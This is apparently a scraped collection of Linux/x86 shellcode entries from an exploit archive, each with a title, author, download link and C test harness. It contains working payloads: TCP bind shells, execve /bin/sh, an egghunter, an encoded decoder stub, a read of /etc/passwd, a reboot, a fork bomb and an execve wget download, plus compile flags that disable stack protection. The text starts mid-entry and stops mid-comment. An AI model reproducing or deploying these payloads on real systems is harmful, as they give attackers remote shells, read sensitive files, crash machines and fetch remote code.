" * 65 bytes", " * null-bytes free", " * the port number is set by the system and can be discovered using nmap", "   (see http://manuals.ts.fujitsu.com/file/4686/posix_s.pdf, page 23, section 2.6.6)", "", "", " # gcc -m32 -fno-stack-protector -z execstack shell_bind_tcp_random_port_shellcode.c -o shell_bind_tcp_random_port_shellcode", " # ./shell_bind_tcp_random_port_shellcode", "", " Testing", " # netstat -anp | grep shell", " # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to the port open by shellcode)", " # nc 127.0.0.1 port", "", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] = \\", "", "\"\\x6a\\x66\\x58\\x99\\x6a\\x01\\x5b\\x52\\x53\\x6a\\x02\\x89\"", "\"\\xe1\\xcd\\x80\\x89\\xc6\\x5f\\xb0\\x66\\xb3\\x04\\x52\\x56\"", "\"\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x89\\x54\\x24\\x08\\xcd\"", "\"\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\"", "\"\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"", "\"\\xe3\\x52\\x53\\xeb\\xca\";", "", "main ()", "{", "", "\tprintf(\"Shellcode Length:  %d\\n\", strlen(code));", "", "\tint (*ret)() = (int(*)())code;", "", "\tret();", "", "}"]},
{"Title": "Linux/x86 - Bind (1111/TCP) Shell + GetPC/Call/Ret Method + Null-Free Shellcode (89 bytes)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-835.php", "View": null, "code": ["/*", "", " Shell Bind TCP (GetPC/Call/Ret Method) - C Language", " Linux/x86", "", " Written in 2013 by Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", " This source is licensed under the Creative Commons", " Attribution-ShareAlike 3.0 Brazil License.", "", " To view a copy of this license, visit", "", "   http://creativecommons.org/licenses/by-sa/3.0/", "", " You are free:", "", "    to Share - to copy, distribute and transmit the work", "    to Remix - to adapt the work", "    to make commercial use of the work", "", " Under the following conditions:", "   Attribution - You must attribute the work in the manner", "                 specified by the author or licensor (but", "                 not in any way that suggests that they", "                 endorse you or your use of the work).", "", "   Share Alike - If you alter, transform, or build upon", "                 this work, you may distribute the", "                 resulting work only under the same or", "                 similar license to this one.", "", "*/", "", "/*", "", " shell_bind_tcp_getpc_shellcode", "", " * 89 bytes", " * null-bytes free", " * uses GetPC method for fun and profit", "", "", " # gcc -m32 -fno-stack-protector -z execstack shell_bind_tcp_getpc_shellcode.c -o shell_bind_tcp_getpc_shellcode", " # ./shell_bind_tcp_getpc_shellcode", "", " Testing", " # nc 127.0.0.1 11111", "", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] = \\", "", "\"\\xe8\\xff\\xff\\xff\\xff\\xc3\\x5d\\x8d\\x6d\\x4a\\x31\\xc0\"", "\"\\x99\\x6a\\x01\\x5b\\x52\\x53\\x6a\\x02\\xff\\xd5\\x96\\x5b\"", "\"\\x52\\x66\\x68\\x2b\\x67\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\"", "\"\\x56\\xff\\xd5\\x43\\x43\\x52\\x56\\xff\\xd5\\x43\\x52\\x52\"", "\"\\x56\\xff\\xd5\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\"", "\"\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\"", "\"\\x6e\\x89\\xe3\\x52\\x53\\xeb\\x04\\x5f\\x6a\\x66\\x58\\x89\"", "\"\\xe1\\xcd\\x80\\x57\\xc3\";", "", "main ()", "{", "", "        // When the IP contains null-bytes, printf will show a wrong shellcode length.", "", "\tprintf(\"Shellcode Length:  %d\\n\", strlen(code));", "", "\t// Pollutes all registers ensuring that the shellcode runs in any circumstance.", "", "\t__asm__ (\"movl $0xffffffff, %eax\\n\\t\"", "\t\t \"movl %eax, %ebx\\n\\t\"", "\t\t \"movl %eax, %ecx\\n\\t\"", "\t\t \"movl %eax, %edx\\n\\t\"", "\t\t \"movl %eax, %esi\\n\\t\"", "\t\t \"movl %eax, %edi\\n\\t\"", "\t\t \"movl %eax, %ebp\");", "", "", "\t// Setting the port number (byte reverse order) and Calling the shellcode", "", "\t__asm__ (\"movw $0x672b, (code+27)\\n\\t\"", "\t\t\"call code\");", "\t", "}"]},
{"Title": "Linux/x86 - Bind (1111/TCP) Shell + Null-Free Shellcode (73 bytes)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-836.php", "View": null, "code": ["/*", "", " Tiny Shell Bind TCP Shellcode - C Language", " Linux/x86", "", " Written in 2013 by Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", " This source is licensed under the Creative Commons", " Attribution-ShareAlike 3.0 Brazil License.", "", " To view a copy of this license, visit", "", "   http://creativecommons.org/licenses/by-sa/3.0/", "", " You are free:", "", "    to Share - to copy, distribute and transmit the work", "    to Remix - to adapt the work", "    to make commercial use of the work", "", " Under the following conditions:", "   Attribution - You must attribute the work in the manner", "                 specified by the author or licensor (but", "                 not in any way that suggests that they", "                 endorse you or your use of the work).", "", "   Share Alike - If you alter, transform, or build upon", "                 this work, you may distribute the", "                 resulting work only under the same or", "                 similar license to this one.", "", "*/", "", "/*", "", " tiny_shell_bind_tcp_shellcode", "", " * 73 bytes", " * null-free if the port is", "", "", " # gcc -m32 -fno-stack-protector -z execstack tiny_shell_bind_tcp_shellcode.c -o tiny_shell_bind_tcp_shellcode", "", " Testing", " # ./tiny_shell_bind_tcp_shellcode", " # nc 127.0.0.1 11111", "", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] = \\", "", "\"\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\x43\\x52\\x53\\x6a\"", "\"\\x02\\x89\\xe1\\xcd\\x80\\x5b\\x5e\\x52\\x66\\x68\"", "\"\\x2b\\x67\\x6a\\x10\\x51\\x50\\xb0\\x66\\x89\\xe1\"", "\"\\xcd\\x80\\x89\\x51\\x04\\xb0\\x66\\xb3\\x04\\xcd\"", "\"\\x80\\xb0\\x66\\x43\\xcd\\x80\\x59\\x93\\x6a\\x3f\"", "\"\\x58\\xcd\\x80\\x49\\x79\\xf8\\xb0\\x0b\\x68\\x2f\"", "\"\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\"", "\"\\x41\\xcd\\x80\";", "", "main ()", "{", "", "        // When the Port contains null bytes, printf will show a wrong shellcode length.", "", "\tprintf(\"Shellcode Length:  %d\\n\", strlen(code));", "", "\t// Pollutes all registers ensuring that the shellcode runs in any circumstance.", "", "\t__asm__ (\"movl $0xffffffff, %eax\\n\\t\"", "\t\t \"movl %eax, %ebx\\n\\t\"", "\t\t \"movl %eax, %ecx\\n\\t\"", "\t\t \"movl %eax, %edx\\n\\t\"", "\t\t \"movl %eax, %esi\\n\\t\"", "\t\t \"movl %eax, %edi\\n\\t\"", "\t\t \"movl %eax, %ebp\\n\\t\"", "", "\t// Setting the port", "\t\t \"movw $0x672b, (code+20)\\n\\t\"", "", "\t// Calling the shellcode", "\t\t \"call code\");", "", "}"]},
{"Title": "Linux/x86 - Bind (Random TCP Port) Shell + Null-Free Shellcode (57 bytes)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-837.php", "View": null, "code": ["/*", "", " Tiny Shell Bind TCP Random Port Shellcode - C Language", " Linux/x86", "", " Written in 2013 by Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", " This source is licensed under the Creative Commons", " Attribution-ShareAlike 3.0 Brazil License.", "", " To view a copy of this license, visit", "", "   http://creativecommons.org/licenses/by-sa/3.0/", "", " You are free:", "", "    to Share - to copy, distribute and transmit the work", "    to Remix - to adapt the work", "    to make commercial use of the work", "", " Under the following conditions:", "   Attribution - You must attribute the work in the manner", "                 specified by the author or licensor (but", "                 not in any way that suggests that they", "                 endorse you or your use of the work).", "", "   Share Alike - If you alter, transform, or build upon", "                 this work, you may distribute the", "                 resulting work only under the same or", "                 similar license to this one.", "", "*/", "", "/*", "", " tiny_shell_bind_tcp_random_port_shellcode", "", " * 57 bytes", " * null-free", "", "", " # gcc -m32 -fno-stack-protector -z execstack tiny_shell_bind_tcp_random_port_shellcode.c -o tiny_shell_bind_tcp_random_port_shellcode", "", " Testing", " # ./tiny_shell_bind_tcp_random_port_shellcode", " # netstat -anp | grep shell", " # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to th$", " # nc 127.0.0.1 port", "", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] = \\", "", "\"\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\x43\\x52\\x53\\x6a\"", "\"\\x02\\x89\\xe1\\xcd\\x80\\x52\\x50\\x89\\xe1\\xb0\"", "\"\\x66\\xb3\\x04\\xcd\\x80\\xb0\\x66\\x43\\xcd\\x80\"", "\"\\x59\\x93\\x6a\\x3f\\x58\\xcd\\x80\\x49\\x79\\xf8\"", "\"\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\"", "\"\\x69\\x6e\\x89\\xe3\\x41\\xcd\\x80\";", "", "main ()", "{", "", "        // When the Port contains null bytes, printf will show a wrong shellcode length.", "", "\tprintf(\"Shellcode Length:  %d\\n\", strlen(code));", "", "\t// Pollutes all registers ensuring that the shellcode runs in any circumstance.", "", "\t__asm__ (\"movl $0xffffffff, %eax\\n\\t\"", "\t\t \"movl %eax, %ebx\\n\\t\"", "\t\t \"movl %eax, %ecx\\n\\t\"", "\t\t \"movl %eax, %edx\\n\\t\"", "\t\t \"movl %eax, %esi\\n\\t\"", "\t\t \"movl %eax, %edi\\n\\t\"", "\t\t \"movl %eax, %ebp\\n\\t\"", "", "\t// Calling the shellcode", "\t\t \"call code\");", "", "}"]},
{"Title": "Linux/x86 - Egghunter (0x50905090) + Null-Free Shellcode (38 bytes)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-839.php", "View": null, "code": ["/*", "", "   Egg Hunter Shellcode - C Language - Linux/x86", "   Copyright (C) 2013 Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", "   This program is free software: you can redistribute it and/or modify", "   it under the terms of the GNU General Public License as published by", "   the Free Software Foundation, either version 3 of the License, or", "   (at your option) any later version.", "", "   This program is distributed in the hope that it will be useful,", "   but WITHOUT ANY WARRANTY; without even the implied warranty of", "   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the", "   GNU General Public License for more details.", "", "   You should have received a copy of the GNU General Public License", "   along with this program.  If not, see <http://www.gnu.org/licenses/>.", "", "*/", "", "/*", "", "   egg_hunter_shellcode", "", "   * 38 bytes", "   * null-free if egg signature is", "", "   # gcc -m32 -fno-stack-protector -z execstack egg_hunter_shellcode.c -o egg_hunter_shellcode", "", "   Testing", "   # ./egg_hunter_shellcode", "", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char egg[] = \\", "", "              // Write \"Egg Mark\" and exit", "", "              \"\\x90\\x50\\x90\\x50\"   // <- First Four Bytes of Signature", "              \"\\x90\\x50\\x90\\x50\"   // <- Same first bytes are mandatory", "              \"\\x31\\xdb\"", "              \"\\xf7\\xe3\\xb0\\x04\\x6a\\x0a\\x68\\x4d\\x61\\x72\"", "              \"\\x6b\\x68\\x45\\x67\\x67\\x20\\xb3\\x01\\x89\\xe1\"", "              \"\\xb2\\x09\\xcd\\x80\\xb0\\x01\\xcd\\x80\";", "", "              unsigned char egghunter[] = \\", "", "              // Search for the Egg Signature (0x50905090 x 2) - the Egg's 8 first instructions (nop, push eax, nop, push eax...)", "", "              \"\\xfc\\x31\\xc9\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\"", "              \"\\x42\\x6a\\x21\\x58\\x8d\\x5a\\x04\\xcd\\x80\\x3c\"", "              \"\\xf2\\x74\\xee\\xb8\"", "              \"\\x90\\x50\\x90\\x50\"   // <- Signature", "              \"\\x89\\xd7\\xaf\\x75\\xe9\\xaf\\x75\\xe6\\xff\\xe7\";", "", "", "main ()", "{", "", "    // When contains null bytes, printf will show a wrong shellcode length.", "", "    printf(\"Shellcode Length:  %d\\n\", strlen(egghunter));", "", "    // Pollutes all registers ensuring that the shellcode runs in any circumstance.", "", "    __asm__ (\"movl $0xffffffff, %eax\\n\\t\"", "            \"movl %eax, %ebx\\n\\t\"", "            \"movl %eax, %ecx\\n\\t\"", "            \"movl %eax, %edx\\n\\t\"", "            \"movl %eax, %esi\\n\\t\"", "            \"movl %eax, %edi\\n\\t\"", "            \"movl %eax, %ebp\\n\\t\"", "", "            // Setting the egg hunter signature to search (byte reverse order)", "", "            \"movl $0x50905090, (egghunter+24)\\n\\t\"", "", "            // Calling the shellcode", "            \"call egghunter\");", "", "}"]},
{"Title": "Linux/x86 - Insertion Decoder + Null-Free Shellcode (33+ bytes)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-840.php", "View": null, "code": ["/*", "", " Insertion Decoder Shellcode - C Language - Linux/x86", " Copyright (C) 2013 Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", " This program is free software: you can redistribute it and/or modify", " it under the terms of the GNU General Public License as published by", " the Free Software Foundation, either version 3 of the License, or", " (at your option) any later version.", "", " This program is distributed in the hope that it will be useful,", " but WITHOUT ANY WARRANTY; without even the implied warranty of", " MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the", " GNU General Public License for more details.", "", " You should have received a copy of the GNU General Public License", " along with this program.  If not, see <http://www.gnu.org/licenses/>.", "", "*/", "", "/*", "", "   insertion_decoder_shellcode", "", "  * decoder has 33 bytes (the final amount depends on the shellcode length plus garbage bytes)", "  * null-free", "  * decodes any pattern of garbage insertion", "      Eg: True Byte = X, Garbage Byte = _", "           _ X _ X _ ...", "           X _ _ X X ...", "           X X X _ _ ... ", "", "", "   # gcc -m32 -fno-stack-protector -z execstack insertion_decoder_shellcode.c -o insertion_decoder_shellcode", "", "   Testing", "   # ./insertion_decoder_shellcode", "", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char shellcode[] = \\", "", "// Shellcode Decoder (33 bytes)", "\"\\xeb\\x1a\\x5e\\x8d\\x3e\\x31\\xc9\\x8b\\x1c\\x0e\"", "\"\\x41\\x66\\x81\\xfb\"", "\"\\xf1\\xf1\"        // <- End Signature", "\"\\x74\\x0f\\x80\\xfb\"", "\"\\x3f\"            // <- Garbage Byte", "\"\\x74\\xf0\\x88\\x1f\\x47\\xeb\\xeb\\xe8\\xe1\\xff\"", "\"\\xff\\xff\"", "", "// Encoded shellcode (length depends of the shellcode plus garbage bytes)", "\"\\x3f\\x3f\\x3f\\x31\\x3f\\xc9\\x3f\\xf7\\xe1\\x3f\"", "\"\\xb0\\x0b\\x3f\\x51\\x68\\x3f\\x2f\\x2f\\x3f\\x73\"", "\"\\x68\\x3f\\x68\\x2f\\x3f\\x62\\x69\\x3f\\x6e\\x89\"", "\"\\x3f\\xe3\\xcd\\x3f\\x80\\xf1\\xf1\";", "", "", "main ()", "{", "", "        // When contains null bytes, printf will show a wrong shellcode length.", "", "\tprintf(\"Shellcode Length:  %d\\n\", strlen(shellcode));", "", "\t// Pollutes all registers ensuring that the shellcode runs in any circumstance.", "", "\t__asm__ (\"movl $0xffffffff, %eax\\n\\t\"", "\t\t \"movl %eax, %ebx\\n\\t\"", "\t\t \"movl %eax, %ecx\\n\\t\"", "\t\t \"movl %eax, %edx\\n\\t\"", "\t\t \"movl %eax, %esi\\n\\t\"", "\t\t \"movl %eax, %edi\\n\\t\"", "\t\t \"movl %eax, %ebp\\n\\t\"", "", "\t\t // Calling the shellcode", "\t\t \"call shellcode\");", "", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh) + Null-Free Shellcode (21 bytes) (6)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-841.php", "View": null, "code": ["/*", "", " Tiny Execve sh Shellcode - C Language - Linux/x86", " Copyright (C) 2013 Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", " This program is free software: you can redistribute it and/or modify", " it under the terms of the GNU General Public License as published by", " the Free Software Foundation, either version 3 of the License, or", " (at your option) any later version.", "", " This program is distributed in the hope that it will be useful,", " but WITHOUT ANY WARRANTY; without even the implied warranty of", " MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the", " GNU General Public License for more details.", "", " You should have received a copy of the GNU General Public License", " along with this program.  If not, see <http://www.gnu.org/licenses/>", "", "*/", "", "/*", "", "   tiny_execve_sh_shellcode", "", "  * 21 bytes", "  * null-free", "", "", "   # gcc -m32 -fno-stack-protector -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode", "", "   Testing", "   # ./tiny_execve_sh_shellcode", "", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char shellcode[] = \\", "", "\"\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\"", "\"\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\"", "\"\\x80\";", "", "", "main ()", "{", "", "        // When contains null bytes, printf will show a wrong shellcode length.", "", "\tprintf(\"Shellcode Length:  %d\\n\", strlen(shellcode));", "", "\t// Pollutes all registers ensuring that the shellcode runs in any circumstance.", "", "\t__asm__ (\"movl $0xffffffff, %eax\\n\\t\"", "\t\t \"movl %eax, %ebx\\n\\t\"", "\t\t \"movl %eax, %ecx\\n\\t\"", "\t\t \"movl %eax, %edx\\n\\t\"", "\t\t \"movl %eax, %esi\\n\\t\"", "\t\t \"movl %eax, %edi\\n\\t\"", "\t\t \"movl %eax, %ebp\\n\\t\"", "", "\t\t // Calling the shellcode", "\t\t \"call shellcode\");", "", "}"]},
{"Title": "Linux/x86 - Read /etc/passwd file + Null-Free Shellcode (51 bytes)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-842.php", "View": null, "code": ["/*", "", "   Tiny Read File Shellcode - C Language - Linux/x86", "   Copyright (C) 2013 Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", "   This program is free software: you can redistribute it and/or modify", "   it under the terms of the GNU General Public License as published by", "   the Free Software Foundation, either version 3 of the License, or", "   (at your option) any later version.", "", "   This program is distributed in the hope that it will be useful,", "   but WITHOUT ANY WARRANTY; without even the implied warranty of", "   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the", "   GNU General Public License for more details.", "", "   You should have received a copy of the GNU General Public License", "   along with this program.  If not, see <http://www.gnu.org/licenses/>.", "", "*/", "", "/*", "", "   tiny_read_file_shellcode", "", "   * 51 bytes", "   * null-free", "   * read 4096 bytes from /etc/passwd file", "", "", "   # gcc -m32 -fno-stack-protector -z execstack tiny_read_file_shellcode.c -o tiny_read_file_shellcode", "", "   Testing", "   # ./tiny_read_file_shellcode", "", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char shellcode[] = \\", "", "              \"\\x31\\xc9\\xf7\\xe1\\xb0\\x05\\x51\\x68\\x73\\x73\"", "              \"\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x2f\\x2f\"", "              \"\\x65\\x74\\x89\\xe3\\xcd\\x80\\x93\\x91\\xb0\\x03\"", "              \"\\x31\\xd2\\x66\\xba\\xff\\x0f\\x42\\xcd\\x80\\x92\"", "              \"\\x31\\xc0\\xb0\\x04\\xb3\\x01\\xcd\\x80\\x93\\xcd\"", "              \"\\x80\";", "", "", "main ()", "{", "", "    // When contains null bytes, printf will show a wrong shellcode length.", "", "    printf(\"Shellcode Length:  %d\\n\", strlen(shellcode));", "", "    // Pollutes all registers ensuring that the shellcode runs in any circumstance.", "", "    __asm__ (\"movl $0xffffffff, %eax\\n\\t\"", "            \"movl %eax, %ebx\\n\\t\"", "            \"movl %eax, %ecx\\n\\t\"", "            \"movl %eax, %edx\\n\\t\"", "            \"movl %eax, %esi\\n\\t\"", "            \"movl %eax, %edi\\n\\t\"", "            \"movl %eax, %ebp\\n\\t\"", "", "            // Calling the shellcode", "            \"call shellcode\");", "", "}"]},
{"Title": "Linux/x86 - Reboot() + Mutated + Null-Free Shellcode (55 bytes)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-843.php", "View": null, "code": ["/*", "", "   Mutated Reboot Shellcode - C Language - Linux/x86", "   Copyright (C) 2013 Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", "   This program is free software: you can redistribute it and/or modify", "   it under the terms of the GNU General Public License as published by", "   the Free Software Foundation, either version 3 of the License, or", "   (at your option) any later version.", "", "   This program is distributed in the hope that it will be useful,", "   but WITHOUT ANY WARRANTY; without even the implied warranty of", "   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the", "   GNU General Public License for more details.", "", "   You should have received a copy of the GNU General Public License", "   along with this program.  If not, see &t;http://www.gnu.org/licenses/>.", "", "*/", "", "/*", "", "   mutated_reboot_shellcode", "", "   * 55 bytes", "   * null-free", "   * mutated isn't polymorphic (shellcode does not replicate itself to be called polymorphic)", "  ", "  ", "   # gcc -m32 -fno-stack-protector -z execstack mutated_reboot_shellcode.c -o mutated_reboot_shellcode", "", "   Testing", "   * Only run it in a Virtual Machine!!! Your system will crash. Use at your own risk!", "   * To work properly, you must be su!", "", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char shellcode[] = \\", "", "              \"\\x29\\xff\\x74\\x01\\xe8\\x83\\xc7\\x24\\x97\\xeb\"", "              \"\\x01\\xe1\\xcd\\x80\\xeb\\x01\\xff\\x6a\\x29\\x59\"", "              \"\\xeb\\x01\\x01\\xbb\\x67\\x45\\x23\\x01\\xba\\xca\"", "              \"\\x9b\\xc2\\xff\\x31\\xda\\x75\\x01\\xe7\\x87\\xda\"", "              \"\\x8d\\x41\\x2f\\x8d\\x89\\x40\\x19\\x12\\x28\\xeb\"", "              \"\\x02\\xe8\\x01\\xcd\\x80\";", "", "", "main ()", "{", "", "    // When contains null bytes, printf will show a wrong shellcode length.", "", "    printf(\"Shellcode Length:  %d\\n\", strlen(shellcode));", "", "    // Pollutes all registers ensuring that the shellcode runs in any circumstance.", "", "    __asm__ (\"movl $0xffffffff, %eax\\n\\t\"", "            \"movl %eax, %ebx\\n\\t\"", "            \"movl %eax, %ecx\\n\\t\"", "            \"movl %eax, %edx\\n\\t\"", "            \"movl %eax, %esi\\n\\t\"", "            \"movl %eax, %edi\\n\\t\"", "            \"movl %eax, %ebp\\n\\t\"", "", "            // Calling the shellcode", "            \"call shellcode\");", "", "}"]},
{"Title": "Linux/x86 - Fork Bomb + Mutated + Null-Free Shellcode (15 bytes)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-844.php", "View": null, "code": ["/*", "", "   Mutated Fork Bomb Shellcode - C Language - Linux/x86", "   Copyright (C) 2013 Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", "   This program is free software: you can redistribute it and/or modify", "   it under the terms of the GNU General Public License as published by", "   the Free Software Foundation, either version 3 of the License, or", "   (at your option) any later version.", "", "   This program is distributed in the hope that it will be useful,", "   but WITHOUT ANY WARRANTY; without even the implied warranty of", "   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the", "   GNU General Public License for more details.", "", "   You should have received a copy of the GNU General Public License", "   along with this program.  If not, see <http://www.gnu.org/licenses/>.", "", "*/", "", "/*", "", "   mutated_fork_bomb_shellcode", "", "   * 15 bytes", "   * null-free", "   * mutated isn't polymorphic (shellcode does not replicate itself to be called polymorphic)", "", "", "   # gcc -m32 -fno-stack-protector -z execstack mutated_fork_bomb_shellcode.c -o mutated_fork_bomb_shellcode", "", "   Testing", "   * Only run it in a Virtual Machine!!! Your system will crash. Use at your own risk!", "", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char shellcode[] = \\", "", "              \"\\x31\\xff\\xeb\\x01\\xe8\\xb2\\x1d\\x97\\x83\\xe8\"", "              \"\\x1b\\xcd\\x80\\xeb\\xf1\";", "", "", "main ()", "{", "", "    // When contains null bytes, printf will show a wrong shellcode length.", "", "    printf(\"Shellcode Length:  %d\\n\", strlen(shellcode));", "", "    // Pollutes all registers ensuring that the shellcode runs in any circumstance.", "", "    __asm__ (\"movl $0xffffffff, %eax\\n\\t\"", "            \"movl %eax, %ebx\\n\\t\"", "            \"movl %eax, %ecx\\n\\t\"", "            \"movl %eax, %edx\\n\\t\"", "            \"movl %eax, %esi\\n\\t\"", "            \"movl %eax, %edi\\n\\t\"", "            \"movl %eax, %ebp\\n\\t\"", "", "            // Calling the shellcode", "            \"call shellcode\");", "", "}"]},
{"Title": "Linux/x86 - execve wget + Mutated + Null-Free Shellcode (96 bytes)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-845.php", "View": null, "code": ["/*", "", "   Mutated Execve Wget Shellcode - C Language - Linux/x86", "   Copyright (C) 2013 Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", "   This program is free software: you can redistribute it and/or modify", "   it under the terms of the GNU General Public License as published by", "   the Free Software Foundation, either version 3 of the License, or", "   (at your option) any later version.", "", "   This program is distributed in the hope that it will be useful,", "   but WITHOUT ANY WARRANTY; without even the implied warranty of", "   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the", "   GNU General Public License for more details.", "", "   You should have received a copy of the GNU General Public License", "   along with this program.  If not, see <http://www.gnu.org/licenses/>.", "", "*/", "", "/*", "", "   mutated_execve_wget_shellcode", "", "   * 96 bytes", "   * null-free", "   * mutated isn't polymorphic (shellcode does not replicate itself to be called polymorphic)", "", "", "  # gcc -m32 -fno-stack-protector -z execstack mutated_execve_wget_shellcode.c -o mutated_execve_wget_shellcode", "", "  Testing", "  # ./mutated_execve_wget_shellcode", "", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char shellcode[] = \\", "", "              \"\\xeb\\x01\\xe8\\x29\\xdb\\x74\\x01\\x83\\xf7\\xe3\"", "              \"\\xbd\\xf5\\xff\\xff\\xff\\xeb\\x01\\xe8\\x68\\x41\"", "              \"\\x65\\x45\\x72\\x29\\xf6\\x74\\x01\\x83\\x5e\\x56\"", "              \"\\x81\\xf6\\x25\\x4a\\x1f\\x3e\\x56\\xeb\\x01\\x33\"", "              \"\\x68\\x69\\x73\\x2e\\x67\\x89\\x44\\x24\\x0c\\x89\"", "              \"\\xe1\\x6a\\x74\\xeb\\x01\\xe3\\x68\\x2f\\x77\\x67\"", "              \"\\x65\\xeb\\x01\\x83\\x68\\x2f\\x62\\x69\\x6e\\xeb\"", "              \"\\x01\\x33\\x68\\x2f\\x75\\x73\\x72\\x8d\\x1c\\x24\"", "              \"\\xeb\\x01\\x83\\x50\\x51\\x53\\x89\\xe1\\xf7\\xdd\"", "              \"\\x95\\xeb\\x01\\x83\\xcd\\x80\";", "", "", "main ()", "{", "", "    // When contains null bytes, printf will show a wrong shellcode length.", "", "    printf(\"Shellcode Length:  %d\\n\", strlen(shellcode));", "", "    // Pollutes all registers ensuring that the shellcode runs in any circumstance.", "", "    __asm__ (\"movl $0xffffffff, %eax\\n\\t\"", "            \"movl %eax, %ebx\\n\\t\"", "            \"movl %eax, %ecx\\n\\t\"", "            \"movl %eax, %edx\\n\\t\"", "            \"movl %eax, %esi\\n\\t\"", "            \"movl %eax, %edi\\n\\t\"", "            \"movl %eax, %ebp\\n\\t\"", "", "            // Calling the shellcode", "            \"call shellcode\");", "", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh) + Uzumaki Encoded + Null-Free Shellcode (50 bytes)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-846.php", "View": null, "code": ["/*", "", "   Uzumaki Decrypter Shellcode - C Language - Linux/x86", "   Copyright (C) 2013 Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", "   This program is free software: you can redistribute it and/or modify", "   it under the terms of the GNU General Public License as published by", "   the Free Software Foundation, either version 3 of the License, or", "   (at your option) any later version.", "", "   This program is distributed in the hope that it will be useful,", "   but WITHOUT ANY WARRANTY; without even the implied warranty of", "   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the", "   GNU General Public License for more details.", "", "   You should have received a copy of the GNU General Public License", "   along with this program.  If not, see <http://www.gnu.org/licenses/>.", "", "*/", "", "/*", "", "   uzumaki_decrypter_shellcode", "", "   * decrypter has 29 bytes (the final amount depends on the shellcode length)", "   * it decrypts the uzumaki cipher, a custom stream cipher algorithm 